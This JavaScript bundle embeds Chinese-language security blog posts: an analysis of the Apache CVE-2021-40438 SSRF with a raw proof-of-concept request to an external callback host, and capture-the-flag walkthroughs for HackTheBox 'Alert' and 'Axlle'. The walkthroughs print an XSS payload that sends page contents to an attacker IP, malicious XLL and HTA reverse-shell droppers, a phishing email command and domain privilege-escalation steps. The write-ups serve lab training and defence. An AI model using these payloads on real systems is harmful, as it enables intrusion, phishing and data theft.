const h=`---
title: 人工智能时代下的安全建设工作
tags:
  - AI
---
# 概述
## AI当前的能力

## AI当前的局限

## AI如何和当前工作结合`,g=`---
title: APACHE_CVE-2021-40438-SSRF漏洞分析复现
tags:
  - CVE
  - 中间件
categories:
  - CVE
---


## 原因

使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件：

r->filename的前6个字符等于proxy:
r->filename的字符串中含有关键字unix:
unix:关键字后的部分含有字符|
当满足这三个条件后，将unix:后面的内容进行解析，设置成uds_path的值；将字符|后面的内容，设置成rurl的值。


## 利用

这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null

也就是说，我们只需要在unix:与|之间传入内容长度大概超过4092的字符串，就能构造出uds_path为null的结果，让Apache不再发送请求给unix套接字。



## POC

\`\`\`bash

GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://9mwa2r71altec4jboehesqx09rfi3lra.oastify.com/ HTTP/1.1
Host: 123.58.224.8:31003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

\`\`\`

![alt text](../assets/img/image-76.png)

![alt text](../assets/img/image-77.png)


## 危害

`,u=`
## 前置问题
1. 验证代理
2. 验证root
3. 验证是否arm结构
### 代理绕过
1.`,_=`---
title: Alert
tags:
  - 靶场
description: 
password: lidefei
---
> 

## 靶场概述

难度： Easy
描述：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息      |
| --- | ----------- | ----------- |
| IP  | 10.10.16.45 | 10.10.11.44 |
| OS  | kali        |             |

---
## 信息搜集

端口扫描
![](../assets/img/Pasted%20image%2020241124160200.png)

通过子域枚举发现
\`\`\`
ffuf -u http://alert.htb -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H "Host: FUZZ.alert.htb" -fw 20
http://statistics.alert.htb/
\`\`\`

## 攻击向量

只有80端口和22
以80端口的web服务为入口

![](../assets/img/Pasted%20image%2020241124160334.png)

看起来是个markdwon 解析

还有一个xss漏洞
还有一个子域的，但是需要账户和密码

## 漏洞利用

#xss

\`\`\`
<script> fetch("http://alert.htb/") .then(response => response.text()) .then(data => { fetch("http://10.10.xx.xx/?data=" + encodeURIComponent(data)); }) .catch(error => console.error("Error fetching the messages:", error)); <\/script>
\`\`\`

![](../assets/img/Pasted%20image%2020241127160118.png)

![](../assets/img/Pasted%20image%2020241127164853.png)
## 提权


## 知识点回顾
## 总结

`,S=`---
title: RCE的获取shell
tags:
  - "#Linux"
  - "#RCE"
  - pspy
  - commix
  - smb
---
涉及到的知识点
commix 
https://github.com/commixproject/commix
对于代码执行进行测试
\`\`\`
commix -r r.txt
\`\`\`

pspy
https://github.com/DominicBreuker/pspy
PSPY 是一个命令行工具，旨在窥探不需要 root 权限的进程。 它允许您查看其他用户运行的命令、cron 作业等在执行时运行。 非常适合在 CTF 中枚举 Linux 系统。 也非常适合向你的同事展示为什么在命令行上将 secret 作为参数传递是一个坏主意。

该工具从 procfs 扫描中收集信息。 放置在文件系统的选定部分上的 Inotify 观察程序会触发这些扫描，以捕获生存期较短的进程。

sh阅读本领
ko逆向的能力

`,b=`---
title: THB-Axlle
tags:
  - 靶场
  - THB
  - "#域渗透"
password: lidefei
---
> 一句话总结：域内邮件钓鱼到系统权限提升的渗透实践

# 🚀 靶场概述 
**难度**：Hard  
**描述**：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习

---

## 📋 基本信息 
| 🚀     | **本地机器信息**  | **目标机器信息**  |
| ------ | ----------- | ----------- |
| **IP** | 10.10.16.27 | 10.10.11.21 |
| **OS** | \`Kali\`      | Windows     |

---

## 🔍 信息搜集

### 1. 🛠️ 端口扫描
首先使用 \`naabu\` 进行快速端口扫描：

\`\`\`bash
❯ naabu --host 10.10.11.21 > ports.txt

[INF] Found 8 ports on host 10.10.11.21 (10.10.11.21)

# 整理开放端口列表
❯ cut -d ":" -f2 ports.txt | paste -sd,
80,53,135,139,389,445,88,25
\`\`\`

接着使用 \`nmap\` 进行详细的版本探测：

\`\`\`bash
❯ nmap -sCV -p 80,53,135,139,389,445,88,25 10.10.11.21 -T4

PORT    STATE SERVICE       VERSION                             
25/tcp  open  smtp         hMailServer smtpd                                                                                   
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP     
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                   
53/tcp  open  domain       Simple DNS Plus                                                                                     
80/tcp  open  http         Microsoft IIS httpd 10.0                                                                            
|_http-server-header: Microsoft-IIS/10.0                                                                                        
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
135/tcp open  msrpc        Microsoft Windows RPC            
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn       
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: axlle.htb0.)        
445/tcp open  microsoft-ds Windows Server SMB
\`\`\`

###  2. 🔎 服务枚举

#### SMTP 服务 (25/TCP)
- 运行 \`hMailServer smtpd\`
- 支持的命令：
  - \`AUTH LOGIN\`: 支持认证登录
  - \`VRFY\`: 可能用于用户枚举
  - \`SIZE 20480000\`: 最大邮件大小限制

#### DNS 服务 (53/TCP)
- 运行 \`Simple DNS Plus\`
- 域名：\`axlle.htb0\`

#### Web 服务 (80/TCP)
- Microsoft IIS 10.0
- 需进行详细的 Web 应用测试

#### 域控服务
- Kerberos (88/TCP)
- LDAP (389/TCP): Active Directory LDAP
- NetBIOS (139/TCP)
- SMB (445/TCP)
  - 消息签名已启用且必需
  - Windows Server SMB 服务

#### RPC 服务 (135/TCP)
- Microsoft Windows RPC

---

## 🧠 渗透思路

### 攻击面分析

1. **邮件系统**
   - hMailServer 可能存在配置问题
   - 可尝试邮件钓鱼攻击

2. **域环境**
   - 完整的 AD 域环境
   - 可能存在域用户枚举机会
   - Kerberos 认证可能存在配置问题

3. **Web 应用**
   - IIS 10.0 可能存在漏洞
   - 需进行详细的 Web 应用测试

### **1. SMTP 服务 (\`25/tcp\`)**

- **软件信息**: \`hMailServer smtpd\`
    - 确定了具体的 SMTP 服务软件和版本，可能存在已知漏洞。
- **SMTP 命令**:
    - 列出了支持的 SMTP 命令（如 \`HELO\`、\`EHLO\`、\`MAIL\`、\`RCPT\` 等），这些可能被滥用于邮件伪造或滥发邮件攻击。
    - 如果未正确配置，攻击者可能利用 \`VRFY\` 或 \`EXPN\` 命令进行用户枚举。

---
	
### **2. DNS 服务 (\`53/tcp\`)**

- **软件信息**: \`Simple DNS Plus\`
    - 确定了 DNS 服务类型和软件信息。特定版本可能存在漏洞，需检查更新日志和 CVE 数据库。

---

### **3. HTTP 服务 (\`80/tcp\`)**

- **软件信息**: \`Microsoft IIS httpd 10.0\`
    - 明确了 Web 服务的类型和版本。旧版本 IIS 可能有路径遍历、拒绝服务等漏洞。
- **HTTP 头信息**:
    - \`Microsoft-IIS/10.0\` 提供了服务器的具体信息，可以被攻击者用来针对已知漏洞。

---

### **4. Kerberos 服务 (\`88/tcp\`)**

- **时间信息**:
    - 提供了服务器时间 (\`2024-11-22 07:25:36Z\`)，攻击者可能利用此信息尝试时间同步攻击（如 Kerberos 密钥攻击）。
- **服务名称**: \`Microsoft Windows Kerberos\`
    - 指明了 Kerberos 服务，可能存在票据伪造（Golden Ticket）等攻击风险。

---

### **5. LDAP 服务 (\`389/tcp\`)**

- **服务信息**: \`Microsoft Windows Active Directory LDAP\`
    - 暴露了域名 (\`axlle.htb0.\`) 和站点名称 (\`Default-First-Site-Name\`)，攻击者可以尝试基于域的枚举和密码喷洒攻击。
    - 如果 LDAP 配置为匿名绑定，可能导致敏感信息泄露（如用户、组等目录数据）。

---

### **6. SMB 服务 (\`445/tcp\`)**

- **服务信息**: \`microsoft-ds?\`
    - 暴露 SMB 服务，如果 SMBv1 未禁用，可能被用来执行远程代码执行攻击（如 EternalBlue）。
- **脚本结果**:
    - **时间偏移 (\`clock-skew\`)**: \`-13m25s\` 表示系统时间与标准时间不同步，这可能影响某些安全机制（如 Kerberos 身份验证）。
    - **安全模式 (\`smb2-security-mode\`)**:
        - \`Message signing enabled and required\`：虽然签名被启用和强制，但仍需确认 SMB 协议是否安全配置。

---

### **7. 主机信息**

- **主机名 (\`Host: MAINFRAME\`)**:
    - 提供了主机名，可能用于网络探索或社会工程攻击。
- **操作系统 (\`OS: Windows\`)**:
    - 指明了操作系统是 Windows，攻击者可能依据此信息定位特定漏洞。

---

### **风险分析**

- **暴露的敏感信息**:
    - 运行服务的具体版本（如 \`hMailServer smtpd\`、\`Simple DNS Plus\`、\`Microsoft IIS 10.0\`）。
    - LDAP 和 Kerberos 服务暴露了域和站点信息。
    - SMB 时间偏移可能影响协议安全性。
- **潜在风险**:
    - 可能存在未修补的漏洞。
    - 服务配置不当可能导致用户、组信息泄露或被利用。

---

## 🌐 Web 渗透测试

如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至accounts@axlle.htb。请注意，由于我们的安全状况，所有宏都被禁用。 

XLL （Excel Add-In） 执行攻击是一种网络攻击，它利用 XLL 文件在 Microsoft Excel 中执行恶意代码。XLL 文件是专为与 Excel 一起使用而设计的动态链接库 （DLL），允许开发人员使用自定义函数和特性扩展 Excel 的功能。

### 1. XLL 文件攻击

由于目标禁用了宏，我们可以使用 XLL (Excel Add-In) 进行攻击。XLL 是专为 Excel 设计的动态链接库，可以扩展 Excel 功能。

1. 创建恶意 XLL 文件：

\`\`\`c
#include <windows.h>
 
__declspec(dllexport) void __cdecl xlAutoOpen(void);
 
void __cdecl xlAutoOpen() {
    WinExec("powershell -e <snipped>pAA==", 1);
}
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
\`\`\`

2. 编译 XLL 文件：
\`\`\`bash
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exp.c -luser32 
\`\`\`

3. 发送钓鱼邮件：
\`\`\`bash
swaks --to accounts@axlle.htb \\
      --from root@test.htb \\
      --body "Shell" \\
      --header "Subject: Help me Breach the System" \\
      --attach @shell.xll
\`\`\`

### 2. 获取初始访问

成功获取反弹 shell 后，我们使用 PowerShell 获取更稳定的会话：

\`\`\`powershell
powershell -e <base64_encoded_reverse_shell>
\`\`\`

## 🔍 内网信息收集

### 1. 自动化枚举

使用 WinPEAS 进行初步信息收集：
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe

### 2. 邮件系统枚举

由于机器上运行着邮件服务器，且用户 gideon 管理邮件系统，我们检查最新邮件：

发现重要信息：
> 发件人：webdevs@axlle.htb
> 收件人：dallon.matrix
> 内容：可以将 Web 快捷方式拖放到 \`C:\\inetpub\\testing\` 文件夹中，webdevs 用户将自动运行它

### 3. HTA 文件攻击

我们可以使用 HTA 文件攻击来获取 shell。HTA 文件是 HTML 应用程序，可以包含恶意代码。

1. 创建恶意 HTA 文件：

\`\`\`html
<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
        var c = "powershell -e <snipped>pAA==";  
        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
<\/script>
</head>
<body>
<script>self.close();<\/script>
</body>
</html>
\`\`\`

2. 发送 HTA 文件：
\`\`\`bash
impacket-smbserver -smb2support share .
\`\`\`

3. 等待自动化运行 HTA 文件：

成功获取反弹 shell 后，我们使用 PowerShell 获取更稳定的会话：

\`\`\`powershell
powershell -e <base64_encoded_reverse_shell>
\`\`\`

## 🔨 权限提升

### 1. 域内信息收集

使用 BloodHound 进行域内信息收集：

1. 上传 BloodHound：
\`\`\`bash
impacket-smbserver share $(pwd) -smb2support
\`\`\`

2. 在目标机器上执行：
\`\`\`powershell
.\\bloodhound.exe -c all
\`\`\`

### 2. 权限提升路径分析

通过 BloodHound 分析发现：
- 组 \`WEB DEVS@AXLLE.HTB\` 的成员可以修改用户 \`JACOB.GREENY@AXLLE.HTB\` 的密码
- 不需要知道该用户的当前密码

### 3. 利用 PowerView 修改密码

1. 上传 PowerView：
\`\`\`powershell
copy \\\\10.10.16.27\\share\\PowerView.ps1 .
\`\`\`

2. 修改用户密码：
\`\`\`powershell
Set-DomainUserPassword -Identity 'JACOB.GREENY' -AccountPassword (ConvertTo-SecureString -AsPlainText 'NewPassword123!' -Force)
\`\`\`

3. 使用新密码通过 WinRM 连接：
\`\`\`powershell
evil-winrm -i 10.10.11.21 -u JACOB.GREENY -p 'NewPassword123!'
\`\`\`

### 4. 系统权限提升

1. 发现自动化程序：
在 \`C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\` 目录下发现 \`standalonerunner.exe\`

2. 检查文件权限：
\`\`\`powershell
icacls standalonerunner.exe
\`\`\`

权限分配：
- 完全控制：
  - \`AXLLE\\Administrator\`
  - \`NT AUTHORITY\\SYSTEM\`
  - \`BUILTIN\\Administrators\`
- 读取和执行，写入：
  - \`AXLLE\\App Devs\`
- 读取并执行：
  - \`BUILTIN\\Users\`
  - \`APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES\`
  - \`APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES\`
- 只读：
  - \`Everyone\`

3. 替换恶意程序：
创建反弹 shell 的可执行文件并替换原文件

4. 等待自动化运行，获取 SYSTEM 权限

## 📚 知识点回顾

### 1. 信息收集技巧
- **端口扫描**
  - 使用 \`naabu\` 快速扫描
  - 使用 \`nmap\` 进行详细版本探测
- **服务枚举**
  - SMTP 服务配置分析
  - Active Directory 域环境识别
  - Web 服务版本识别

### 2. 攻击技术
- **邮件钓鱼**
  - XLL 文件攻击绕过宏限制
  - HTA 文件执行技巧
- **域内渗透**
  - BloodHound 域内信息收集
  - PowerView 密码修改
  - 自动化任务劫持

### 3. 权限提升技巧
- **横向移动**
  - 利用域用户权限
  - WinRM 远程连接
- **纵向提升**
  - 文件权限分析
  - 系统服务替换
  - 自动化任务利用

## 🎯 总结

### 攻击链回顾
1. 通过邮件系统投递 XLL 文件获取初始访问
2. 利用 HTA 文件获取更稳定的 shell
3. 使用 BloodHound 发现域内提权路径
4. 通过 PowerView 修改域用户密码
5. 利用自动化任务获取系统权限

### 防御建议
1. **邮件安全**
   - 严格限制附件类型
   - 实施邮件安全网关
2. **域环境加固**
   - 严格控制域用户权限
   - 定期审计域内权限
3. **系统加固**
   - 限制自动化任务权限
   - 加强文件系统权限控制

### 工具总结
- **信息收集**：naabu、nmap
- **域内渗透**：BloodHound、PowerView
- **权限提升**：WinPEAS
- **远程连接**：Evil-WinRM
`,v=`---
title: THB-Axlle-域内邮件钓n鱼到系统权限提升的渗透实践
tags:
  - 靶场
  - THB
  - "#域渗透"
---
> 域内邮件钓鱼到系统权限提升的渗透实践

# 🚀 靶场概述 
**难度**：Hard  
**描述**：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习

---

## 📋 基本信息 
| 🚀     | **本地机器信息**  | **目标机器信息**  |
| ------ | ----------- | ----------- |
| **IP** | 10.10.16.27 | 10.10.11.21 |
| **OS** | \`Kali\`      | Windows     |

---

## 🔍 信息搜集

### 1. 🛠️ 端口扫描
首先使用 \`naabu\` 进行快速端口扫描：

\`\`\`bash
❯ naabu --host 10.10.11.21 > ports.txt

[INF] Found 8 ports on host 10.10.11.21 (10.10.11.21)

# 整理开放端口列表
❯ cut -d ":" -f2 ports.txt | paste -sd,
80,53,135,139,389,445,88,25
\`\`\`

接着使用 \`nmap\` 进行详细的版本探测：

\`\`\`bash
❯ nmap -sCV -p 80,53,135,139,389,445,88,25 10.10.11.21 -T4

PORT    STATE SERVICE       VERSION                             
25/tcp  open  smtp         hMailServer smtpd                                                                                   
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP     
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                   
53/tcp  open  domain       Simple DNS Plus                                                                                     
80/tcp  open  http         Microsoft IIS httpd 10.0                                                                            
|_http-server-header: Microsoft-IIS/10.0                                                                                        
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
135/tcp open  msrpc        Microsoft Windows RPC            
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn       
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: axlle.htb0.)        
445/tcp open  microsoft-ds Windows Server SMB
\`\`\`

###  2. 🔎 服务枚举

#### SMTP 服务 (25/TCP)
- 运行 \`hMailServer smtpd\`
- 支持的命令：
  - \`AUTH LOGIN\`: 支持认证登录
  - \`VRFY\`: 可能用于用户枚举
  - \`SIZE 20480000\`: 最大邮件大小限制

#### DNS 服务 (53/TCP)
- 运行 \`Simple DNS Plus\`
- 域名：\`axlle.htb0\`

#### Web 服务 (80/TCP)
- Microsoft IIS 10.0
- 需进行详细的 Web 应用测试

#### 域控服务
- Kerberos (88/TCP)
- LDAP (389/TCP): Active Directory LDAP
- NetBIOS (139/TCP)
- SMB (445/TCP)
  - 消息签名已启用且必需
  - Windows Server SMB 服务

#### RPC 服务 (135/TCP)
- Microsoft Windows RPC

---

## 🧠 渗透思路

### 攻击面分析

1. **邮件系统**
   - hMailServer 可能存在配置问题
   - 可尝试邮件钓鱼攻击

2. **域环境**
   - 完整的 AD 域环境
   - 可能存在域用户枚举机会
   - Kerberos 认证可能存在配置问题

3. **Web 应用**
   - IIS 10.0 可能存在漏洞
   - 需进行详细的 Web 应用测试

## 🌐 初始访问

### 1. Web 应用信息收集

从网站上发现重要信息：
> 如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至 accounts@axlle.htb。请注意，由于安全状况，所有宏都被禁用。

### 2. XLL 文件攻击

由于目标禁用了宏，我们可以使用 XLL (Excel Add-In) 进行攻击。XLL 是专为 Excel 设计的动态链接库，可以扩展 Excel 功能。

1. 创建恶意 XLL 文件：

\`\`\`c
#include <windows.h>
 
__declspec(dllexport) void __cdecl xlAutoOpen(void);
 
void __cdecl xlAutoOpen() {
    WinExec("powershell -e <base64_encoded_payload>", 1);
}
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
\`\`\`

2. 编译 XLL 文件：
\`\`\`bash
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exp.c -luser32 
\`\`\`

3. 发送钓鱼邮件：
\`\`\`bash
swaks --to accounts@axlle.htb \\
      --from root@test.htb \\
      --body "Shell" \\
      --header "Subject: Help me Breach the System" \\
      --attach @shell.xll
\`\`\`

![](assets/img/Pasted%20image%2020241122160927.png)
![](assets/img/Pasted%20image%2020241122161132.png)

### 3. HTA 文件攻击

我们可以使用 HTA 文件攻击来获取 shell。HTA 文件是 HTML 应用程序，可以包含恶意代码。

1. 创建恶意 HTA 文件：

\`\`\`html
<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
        var c = "powershell -e <base64_encoded_payload>";  
        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
<\/script>
</head>
<body>
<script>self.close();<\/script>
</body>
</html>
\`\`\`

2. 发送 HTA 文件：
\`\`\`bash
impacket-smbserver -smb2support share .
\`\`\`

![](assets/img/Pasted%20image%2020241122171329.png)

成功获取反弹 shell：
![](assets/img/Pasted%20image%2020241122171438.png)

## 🔨 权限提升

### 1. 域内信息收集

使用 BloodHound 进行域内信息收集：

![](assets/img/Pasted%20image%2020241122171929.png)
![](assets/img/Pasted%20image%2020241122172116.png)

1. 上传 BloodHound：
\`\`\`bash
impacket-smbserver share $(pwd) -smb2support
\`\`\`

2. 在目标机器上执行：
\`\`\`powershell
.\\bloodhound.exe -c all
\`\`\`

![](assets/img/Pasted%20image%2020241122172544.png)

![](assets/img/Pasted%20image%2020241122173441.png)

![](assets/img/Pasted%20image%2020241122173452.png)

### 2. 权限提升路径分析

通过 BloodHound 分析发现：
- 组 \`WEB DEVS@AXLLE.HTB\` 的成员可以修改用户 \`JACOB.GREENY@AXLLE.HTB\` 的密码
- 不需要知道该用户的当前密码

### 3. 利用 PowerView 修改密码

1. 上传 PowerView：
\`\`\`powershell
copy \\\\10.10.16.27\\share\\PowerView.ps1 .
\`\`\`

2. 修改用户密码：
\`\`\`powershell
Set-DomainUserPassword -Identity 'JACOB.GREENY' -AccountPassword (ConvertTo-SecureString -AsPlainText 'NewPassword123!' -Force)
\`\`\`

![](assets/img/Pasted%20image%2020241122175636.png)

3. 使用新密码通过 WinRM 连接：

![](assets/img/Pasted%20image%2020241122174558.png)
![](assets/img/Pasted%20image%2020241122175654.png)

### 4. 系统权限提升

1. 发现自动化程序：
在 App Development 文件夹中发现 README.md 文件：
![](assets/img/Pasted%20image%2020241122180500.png)

README.md 文件显示 standalonerunner.exe 文件正在作为自动化的 SYSTEM 运行：
![](assets/img/Pasted%20image%2020241122180512.png)

2. 检查文件权限：
![](assets/img/Pasted%20image%2020241122180428.png)

3. 替换恶意程序：
